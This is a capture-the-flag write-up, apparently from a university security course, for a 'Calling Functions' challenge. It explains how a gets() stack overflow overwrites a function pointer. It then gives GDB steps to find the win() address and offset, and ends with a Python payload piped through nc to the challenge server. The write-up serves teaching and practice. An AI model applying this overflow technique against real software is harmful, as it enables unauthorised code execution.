# Challenge `Calling Functions` writeup

- Vulnerability: What type of vulnerability is being exploited
  - Stack-based Buffer Overflow
- Where: Where is the vulnerability present
  - The vulnerability is located in the `main` function:
```c
char buffer[32];
int (*fp)();
gets(buffer);
```
The buffer variable is placed on the stack before the function pointer `fp`.
Overflowing `buffer` allows the attacker to overwrite `fp`.
- Impact: What results of exploiting this vulnerability
  - Overwrite the function pointer fp
  - Point it to the address of the win function
  - Force the program to execute win()

## Steps to reproduce

1. Code analysis: 
```c
void win() { ... }

int main() {
    int (*fp)();
    char buffer[32];
    gets(buffer);
    if(fp) fp();
}
```
We want to overwrite fp with the address of win so that it gets called.
2. Finding addresses and offsets using GDB
```
print win
```
Output: `$1 = {void ()} 0x80486f1 <win>`
```
break main
run
next
next
next
print &buffer
print &fp
print (char*)&fp - (char*)&buffer
```
Output: `$3 = 32`
3. Send the payload to the challenge server having the little-endian system in consideration:
```bash
python3 - << 'EOF' | nc mustard.stt.rnl.tecnico.ulisboa.pt 25153
import sys
sys.stdout.buffer.write(b"A"*32 + b"\xf1\x86\x04\x08")
EOF

```